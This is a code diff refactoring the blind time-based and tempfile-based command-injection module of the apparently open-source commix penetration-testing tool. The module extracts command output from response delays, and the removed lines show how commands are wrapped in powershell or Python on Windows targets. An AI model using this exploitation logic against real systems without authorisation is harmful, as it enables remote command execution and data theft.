@@ -15,12 +15,9 @@ For more see the file 'readme/COPYING' for copying permission.
 
 import re
 import os
-import sys
 import time
-import json
 import string
 import random
-import statistics
 import threading
 try:
   import concurrent.futures
@@ -30,18 +27,14 @@ except ImportError:
   _THREADS_SUPPORTED = False
 from src.utils import menu
 from src.utils import settings
-from src.core.requests import proxy
-from src.core.requests import headers
 from src.core.requests import requests
-from src.core.requests import parameters
 from src.core.requests import stability
 from src.utils import common
 from src.core.injections.controller import checks
+from src.core.injections.controller import execution
 from src.utils import session_handler
 from src.thirdparty.six.moves import urllib as _urllib
-from src.thirdparty.six.moves import input as _input
 from src.thirdparty.six.moves import html_parser as _html_parser
-from src.thirdparty.colorama import Fore, Back, Style, init
 
 """
 Abort the thread pool on SystemExit; KeyboardInterrupt is handled by the caller.
@@ -55,30 +48,16 @@ The main time-realative command injection exploitation.
 """
 def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique):
 
-  if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
-    from src.core.injections.blind.techniques.time_based import tb_payloads as payloads
-  else:
-    from src.core.injections.semiblind.techniques.tempfile_based import tfb_payloads as payloads
+  payloads = execution.select_payloads_module(technique)
 
   if settings.TARGET_OS == settings.OS.WINDOWS:
-    previous_cmd = cmd
-    if interpreter:
-      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
-        cmd = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; print len(os.popen('cmd /c " + cmd + "').read().strip())\""
-      else:
-        cmd = checks.quoted_cmd(cmd)
-    else:
-      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
-        cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim().length"
-      else:
-        cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim()"
+    cmd, previous_cmd = execution.windows_transform_cmd(cmd, technique, interpreter)
 
   if menu.options.file_write:
     minlen = 0
   else:
     minlen = 1
 
-  # Reuse the calibrated timesec instead of recalibrating it for every command.
   if settings.CALIBRATED_TIMESEC is not None:
     timesec = settings.CALIBRATED_TIMESEC
 
@@ -86,7 +65,6 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
   # Warn about network load once before the first command that needs it.
   checks.time_related_attaks_msg()
 
-  # Ask upfront instead of waiting for the first delayed response.
   if settings.EXPLOITATION_PHASE and settings.ADJUST_TIME_DELAY_CHOICE is None:
     msg = "Do you want commix to try to optimize the value(s) for delay responses (option '--time-sec')? [Y/n] "
     settings.ADJUST_TIME_DELAY_CHOICE = common.read_input(msg, default="Y", check_batch=True) in settings.CHOICE_YES
@@ -106,12 +84,11 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
 
   def _warm_up_baseline():
     if len(settings.RESPONSE_TIMES) < settings.MIN_TIME_RESPONSES:
-      info_msg = "Time-related response comparison requires a larger statistical model"
-      info_msg += "." if settings.VERBOSITY_LEVEL != 0 else ", please wait..."
-      settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(info_msg))
+      warn_msg = "Time-related response comparison requires a larger statistical model"
+      warn_msg += "." if settings.VERBOSITY_LEVEL != 0 else ", please wait..."
+      settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_warning_msg(warn_msg))
 
       def _probe():
-        # A candidate no real output could reach, so this never sleeps - a safe, fast sample.
         safe_candidate = int(maxlen) * 2 + 100
         if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
           probe = payloads.get_length(separator, cmd, safe_candidate, timesec, http_request_method)
@@ -123,7 +100,6 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
         if settings.VERBOSITY_LEVEL == 0:
           settings.print_data_to_stdout(".")
 
-      # Sample with the same concurrency as extraction; a serial baseline underestimates response time.
       fan_out = settings.THREADS if (settings.THREADS > 1 and _THREADS_SUPPORTED) else 1
       while len(settings.RESPONSE_TIMES) < settings.MIN_TIME_RESPONSES:
         try:
@@ -137,7 +113,6 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
       if settings.VERBOSITY_LEVEL == 0:
         settings.print_data_to_stdout(" (done)")
 
-  # Flags this run's output as suspect if the connection is (or was already found to be) lagging.
   def _check_lagging():
     nonlocal length_suspect, lagging_detected
     if checks.check_lagging():
@@ -146,7 +121,6 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
   # Guard timesec so concurrent payloads use the same value for sending and validation.
   timesec_lock = threading.Lock()
 
-  # Shrink the delay on a clearly-good read - no static floor, the stdev term self-protects jittery targets.
   delay_candidates = [0] * settings.TIME_DELAY_CANDIDATES
   def _adjust_time_delay(exec_time, lower_limit):
     nonlocal timesec
@@ -209,8 +183,6 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
 
   output_length = None
   if _cached_length is not None:
-    # Length already confirmed by the interrupted run this is resuming - reuse it
-    # instead of redoing the whole bisection/validation dance.
     output_length = _cached_length
     found_chars = True
     if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED and not interpreter:
@@ -226,7 +198,6 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
     info_msg += "." if settings.VERBOSITY_LEVEL != 0 else ", please wait..."
     settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(info_msg))
 
-    # Tempfile-based oracle now supports <=, so it bisects like time-based; only the experimental path remains exact-match-only.
     if not (technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED and interpreter):
       # Binary search the output length, mirroring _bisect_once() below.
       def _length_delayed(candidate):
@@ -265,7 +236,6 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
       output_length = _bisect_length()
 
       if output_length is not None:
-        # Verify the bisection boundary independently; sustained bias can converge on the wrong boundary.
         def _boundary_holds(candidate):
           if not _length_delayed(candidate):
             return False
@@ -273,14 +243,12 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
             return False
           return True
 
-        # Independently verify with "-eq" instead of "-le" to catch systematic comparison bias; no-op for time-based.
         def _exact_length_confirmed(candidate):
           if technique != settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
             return True
           payload = payloads.cmd_execution(separator, cmd, candidate, OUTPUT_TEXTFILE, timesec, http_request_method, operator="-eq")
           return _measure_length(payload)
 
-        # Always require 2 consecutive confirmations, never trust one read alone.
         # Best-of-3 vote once jitter has been seen, for a stronger guarantee.
         def _validate_boundary(candidate):
           if settings.JITTER_SEEN:
@@ -306,12 +274,10 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
           max_revalidations = settings.MAX_LENGTH_REVALIDATIONS * (3 if was_jittery else 1)
           if revalidations >= max_revalidations:
             length_suspect = True
-            # Escalation failed; revert instead of carrying the raised delay into later positions.
             timesec = settings.CALIBRATED_TIMESEC = original_timesec
             break
           revalidations += 1
           settings.print_data_to_stdout(settings.print_error_msg("Invalid length detected. Retrying.."))
-          # User declined delay optimization - retry at the same delay, never raise it.
           if settings.ADJUST_TIME_DELAY_CHOICE != False:
             timesec = settings.CALIBRATED_TIMESEC = timesec + settings.TIME_DELAY_STEP
             warn_msg = "Increasing time delay to " + str(timesec) + " second" + ("s" if timesec > 1 else "") + "."
@@ -325,7 +291,6 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
       if output_length is not None:
         found_chars = True
         if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
-          # The boundary check leaves raw output; convert it to decimal before extraction starts.
           _length_delayed(output_length)
     else:
       # Experimental interpreter path only - its oracle is still exact-match, not bisectable.
@@ -372,7 +337,6 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
     if output_length > 1 and _cached_length is None:
       settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(info_msg))
 
-    # Share confirmed ordinals across positions; use the observed charset when small enough, with full-range fallback.
     observed_chars = set()
     observed_count = [0]
     char_frequency = {}
@@ -416,7 +380,6 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
       body = _stored_partial[len(settings.PARTIAL_VALUE_MARKER):]
       try:
         stored_length, pairs = body.split(":", 1)
-        # Length mismatch - stored positions no longer line up, don't resume into it.
         if int(stored_length) != output_length:
           return
         for pair in pairs.split(","):
@@ -454,8 +417,6 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
 
       def _char_delayed(candidate, operator="-le"):
         nonlocal conn_error_flag
-        # Snapshot once - another thread changing timesec mid-flight would judge
-        # this response against a value its payload was never sent with.
         with timesec_lock:
           local_timesec = timesec
         payload = payloads.get_char(separator, cmd, num_of_chars, candidate, local_timesec, http_request_method, operator=operator) if technique == settings.INJECTION_TECHNIQUE.TIME_BASED else payloads.get_char(separator, OUTPUT_TEXTFILE, num_of_chars, candidate, local_timesec, http_request_method, operator=operator)
@@ -492,7 +453,6 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
             checks.handle_exploitation_interrupt(filename, url)
 
         if not force_full:
-          # Probe frequent characters first; skewed distributions can resolve positions in a few requests.
           with observed_chars_lock:
             top_candidates = sorted(char_frequency, key=char_frequency.get, reverse=True)[:settings.FREQUENCY_PROBE_TOP_K]
           for candidate in top_candidates:
@@ -528,7 +488,6 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
               # The value may be outside this set; boundary validation catches and escalates misses.
               return narrowed[nlo], False
 
-        # Keep each character's bisection serial; threads only process different positions concurrently.
         while hi - lo > 1:
           try:
             mid = (lo + hi) // 2
@@ -578,15 +537,12 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
           max_revalidations = settings.MAX_LENGTH_REVALIDATIONS * (3 if was_jittery else 1)
           if revalidations >= max_revalidations:
             conn_error_flag = True
-            # Escalation failed; revert instead of carrying the raised delay into later positions.
             with timesec_lock:
               timesec = settings.CALIBRATED_TIMESEC = original_timesec
             break
           revalidations += 1
           settings.print_data_to_stdout(settings.print_error_msg("Invalid character detected. Retrying."))
-          # User declined delay optimization - retry at the same delay, never raise it.
           if settings.ADJUST_TIME_DELAY_CHOICE != False:
-            # Lock the update to avoid lost or double-counted increments from concurrent positions.
             with timesec_lock:
               timesec = settings.CALIBRATED_TIMESEC = timesec + settings.TIME_DELAY_STEP
               new_timesec = timesec
@@ -617,7 +573,6 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
         def _delayed(candidate, operator, local_timesec):
           payload = payloads.get_char_alter_interpreter(separator, target, num_of_chars, candidate, local_timesec, http_request_method, operator=operator)
           exec_time, _, _, _, _ = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
-          # Use the adaptive threshold instead of fixed values calibrated to a timesec that may have shrunk.
           return checks.time_related_shell(url_time_response, exec_time, local_timesec)
 
         def _bisect(local_timesec):
@@ -630,7 +585,6 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
               hi = mid
           return lo if lo >= min(char_pool) else None
 
-        # Verify the bisection boundary independently; a noisy read can permanently steer it wrong.
         def _boundary_holds(candidate, local_timesec):
           if not _delayed(candidate, "-le", local_timesec):
             return False
@@ -680,7 +634,7 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
     _load_partial_progress()
     positions_to_extract = [pos for pos in positions if pos not in results_by_position]
     conn_error_positions = set()
-    # Asked once already in do_time_related_proccess(), before this ever runs.
+    # Asked once already in do_time_related_process(), before this ever runs.
     threaded = settings.THREADS > 1 and _THREADS_SUPPORTED and settings.THREADED_TIME_RETRIEVAL_CHOICE != False
     if not threaded:
       remaining = positions_to_extract
@@ -720,7 +674,6 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
               conn_error_positions.add(pos)
             _print_progress()
         except SystemExit as exc:
-          # Already means "leave now" (e.g. checks.quit()) - no prompting.
           _save_progress()
           _abort_executor(executor, exc)
         except KeyboardInterrupt:
@@ -738,7 +691,6 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
       if ascii_char is not None and ascii_char != UNRESOLVED_POSITION:
         output.append(chr(ascii_char))
 
-    # Severe instability converges on the pool's upper bound - >= 1, not >= 2, since a single occurrence already means wrong data.
     boundary_char = chr(max(settings.CHAR_POOL_MULTI))
     if output.count(boundary_char) >= 1 or conn_error_positions or lagging_detected:
       if threaded:
@@ -827,10 +779,7 @@ False-positive check and evaluation.
 """
 def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, interpreter, exec_time, url_time_response, false_positive_warning, technique, retry_attempt=None, retry_total=None, silent=False):
 
-  if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
-    from src.core.injections.blind.techniques.time_based import tb_payloads as payloads
-  else:
-    from src.core.injections.semiblind.techniques.tempfile_based import tfb_payloads as payloads
+  payloads = execution.select_payloads_module(technique)
 
   # silent=True skips the detection-phase chatter for a resume re-verify.
   if not silent:
@@ -882,19 +831,8 @@ def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timese
       return exec_time, ""
 
   if settings.TARGET_OS == settings.OS.WINDOWS:
-    previous_cmd = cmd
-    if interpreter:
-      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
-        cmd = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; print len(os.popen('cmd /c " + cmd + "').read().strip())\""
-      else:
-        cmd = checks.quoted_cmd(cmd)
-    else:
-      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
-        cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim().length"
-      else:
-        cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim()"
+    cmd, previous_cmd = execution.windows_transform_cmd(cmd, technique, interpreter)
 
-  # The verified value is always a single digit (see handler.py's randv1/randv2 ranges), so its output length is always 1.
   output_length = 1
   if not silent and settings.VERBOSITY_LEVEL == 0:
     settings.print_data_to_stdout(".")
@@ -909,13 +847,11 @@ def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timese
     else:
       payload = payloads.cmd_execution(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)
 
-  # Requires the delay twice in a row before accepting - one stray slow response is cheap, two isn't.
   def _retry_confirm(payload):
     nonlocal exec_time, vuln_parameter, prefix, suffix
     consecutive_hits = 0
     for attempt in range(settings.FALSE_POSITIVE_RETRIES):
       before = settings.TOTAL_OF_REQUESTS
-      # Discard the returned payload - prefixes() re-prepending onto it would compound on every retry.
       exec_time, vuln_parameter, _, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
       if stability.request_was_retried(before):
         continue
@@ -994,18 +930,18 @@ def select_output_filename(technique, tmp_path, TAG, prompt=True):
 
   while prompt:
     message = "Do you want to use a random file '" + OUTPUT_TEXTFILE 
-    message += "' to receive the command execution output? [Y/n] "
+    message += "' to receive the execution output? [Y/n] "
     procced_option = common.read_input(message, default="Y", check_batch=True)
 
     if procced_option in settings.CHOICE_YES:
       break
 
     elif procced_option in settings.CHOICE_NO:
-      message = "Enter a filename to receive the command execution output "
+      message = "Enter a filename to receive the execution output "
       message = common.read_input(message, default=OUTPUT_TEXTFILE, check_batch=True)
 
       OUTPUT_TEXTFILE = message
-      info_msg = "Using '" + OUTPUT_TEXTFILE + "' for command execution output."
+      info_msg = "Using '" + OUTPUT_TEXTFILE + "' for execution output."
       settings.print_data_to_stdout(settings.print_info_msg(info_msg))
       break
 
@@ -1056,7 +992,6 @@ def injection_output(url, OUTPUT_TEXTFILE, timesec, technique):
   if not settings.DEFINED_WEBROOT or settings.MULTI_TARGETS or not settings.RECHECK_FILE_FOR_EXTRACTION:
     if menu.options.web_root:
       scheme = _urllib.parse.urlparse(url).scheme
-      hostname = _urllib.parse.urlparse(url).hostname
       netloc = _urllib.parse.urlparse(url).netloc
       output = scheme + "://" + netloc + "/" + OUTPUT_TEXTFILE
       if not settings.DEFINED_WEBROOT or (settings.MULTI_TARGETS and not settings.RECHECK_FILE_FOR_EXTRACTION):
@@ -1064,14 +999,14 @@ def injection_output(url, OUTPUT_TEXTFILE, timesec, technique):
           settings.RECHECK_FILE_FOR_EXTRACTION = True
         while True:
           message =  "Do you want to use the URL '" + output
-          message += "' to receive the command execution output? [Y/n] "
+          message += "' to receive the execution output? [Y/n] "
           procced_option = common.read_input(message, default="Y", check_batch=True)
           if procced_option in settings.CHOICE_YES:
             settings.DEFINED_WEBROOT = output
             break
           elif procced_option in settings.CHOICE_NO:
             message =  "Enter URL to receive "
-            message += "the command execution output "
+            message += "the execution output "
             message = common.read_input(message, default=output, check_batch=True)
             if not re.search(r'^(?:http)s?://', message, re.I):
               common.invalid_option(message)
@@ -1079,7 +1014,7 @@ def injection_output(url, OUTPUT_TEXTFILE, timesec, technique):
             else:
               output = settings.DEFINED_WEBROOT = message
               info_msg = "Using '" + output
-              info_msg += "' for command execution output."
+              info_msg += "' for execution output."
               settings.print_data_to_stdout(settings.print_info_msg(info_msg))
               settings.RECHECK_FILE_FOR_EXTRACTION = True
               if not settings.DEFINED_WEBROOT:
